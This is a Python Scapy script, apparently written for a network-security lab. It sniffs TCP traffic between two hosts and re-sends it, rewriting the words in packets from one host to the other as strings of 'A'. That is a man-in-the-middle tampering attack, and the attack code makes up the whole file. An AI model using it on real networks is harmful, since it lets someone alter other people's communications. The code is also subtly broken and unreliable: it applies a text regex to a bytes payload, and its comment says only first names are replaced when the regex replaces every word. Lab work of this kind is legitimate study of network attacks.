#!/usr/bin/env python3
from scapy.all import *
import re

# Define IP addresses and MAC addresses
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

# Spoof packets by modifying payloads in a TCP packet from A to B
# and leaving TCP packets from B to A unmodified.
def spoof_packet(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # Delete the checksum in the IP & TCP headers, because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # Delete the original TCP payload.
        new_packet = IP(bytes(pkt[IP]))
        del new_packet.chksum
        del new_packet[TCP].payload
        del new_packet[TCP].chksum

        # Construct the new payload based on the old payload.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load  # The original payload data
            # Replace first names with a sequence of A's
            new_data = re.sub(r'\b([A-Za-z]+)\b', lambda match: 'A' * len(match.group(1)), data)
            send(new_packet/new_data)
        else:
            send(new_packet)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        new_packet = IP(bytes(pkt[IP]))
        del new_packet.chksum
        del new_packet[TCP].chksum
        send(new_packet)

# Set the packet filter to capture TCP packets from IP_A and IP_B
packet_filter = 'tcp and (host ' + IP_A + ' or host ' + IP_B + ')'

# Start capturing packets on the eth0 interface and pass them to the spoof_packet function
pkts = sniff(iface='eth0', filter=packet_filter, prn=spoof_packet)
